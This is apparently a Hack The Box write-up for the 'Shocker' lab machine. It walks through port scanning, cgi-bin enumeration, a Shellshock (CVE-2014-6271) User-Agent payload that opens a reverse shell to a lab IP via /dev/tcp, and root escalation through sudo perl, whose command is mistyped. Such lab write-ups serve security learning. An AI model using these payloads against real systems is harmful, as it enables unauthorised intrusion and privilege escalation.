# HTB Shocker Writeup

<code>#shellshock</code> <code>#CVE-2014-6271</code> <code>#perl</code>

## Reconnaissance

`nmap -sC -sV -p- 10.10.10.56`

```
Nmap scan report for 10.10.10.56
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.20 seconds
```

## Enumeration

### Port 80

- Port 80 is hosting a static webpage with the following image:

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 9.25.08 PM.png" width=50% height=50%>

- The following can be initially discovered by enumerating directories/files using [ffuf](https://github.com/ffuf/ffuf)

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,301,403 -u http://10.10.10.56/FUZZ`

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 9.46.11 PM.png" width=50% height=50%>

- The `cgi-bin` directory commonly houses scripts that provides functionality to the web server. With this in mind, an updated scan can enumerate for possible files within this directory.

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 9.59.53 PM.png" width=50% height=50%>

- Reading the `user.sh` file within the `cgi-bin` directory shows the following:

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 10.23.11 PM.png" width=50% height=50%>

### Port 2222

- Port 2222 is running OpenSSH version 7.2p2 Ubuntu 4ubuntu2.2
	- `OpenSSH 7.2p2 Ubuntu 4ubuntu2.2` affected by CVE-2016-6210
		- In OpenSSH 7.2p2 and before, there is a vulnerability where BLOWFISH was used for users that don't exist, SHA256/512 for real users, and checks it against user's saved hashed password. Actors can compare the hash compute speeds for users that do/don't exist to determine valid users on a system.
	- Attempted to exploit, but did not have successful results

## Exploitation

### CVE-2014-6271 Shellshock

- A vulnerability that allows actors to execute arbitrary commands by exploiting a vulnerability in Bash (up to version 4.3). This is possible due to a flaw in how Bash imports a function definition stored into an environmental variable, allowing actors to inject malicious code in these variables and execute the code.

- This valid declaration of a function in an environmental variable can be used to exploit the Shellshock vulnerability and execute code that is trailing behind the declaration.
	`env x=' () {:;};'`

- Injecting the following into the `User-Agent` header will create a shell to connect back to the host that is listening to connections on the specified port, obtaining access to `shelly` on the server.
	`() { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.25/6666 0>&1`

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 11.28.13 PM.png" width=50% height=50%>
<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 11.29.02 PM.png" width=50% height=50%>

## Privilege Escalation

- Observing the commands that the user `shelly` can run with sudo privileges shows the following:

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 11.40.33 PM.png" width=50% height=50%>

- Running perl with sudo privileges allows the current user to run commands with elevated privileges and maintains the level of access.
	- [GTFOBins](https://gtfobins.github.io/gtfobins/perl/)

`sudo perl -e 'exec "/bin.sh;"'`

<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-01-13 at 11.41.04 PM.png" width=50% height=50%>
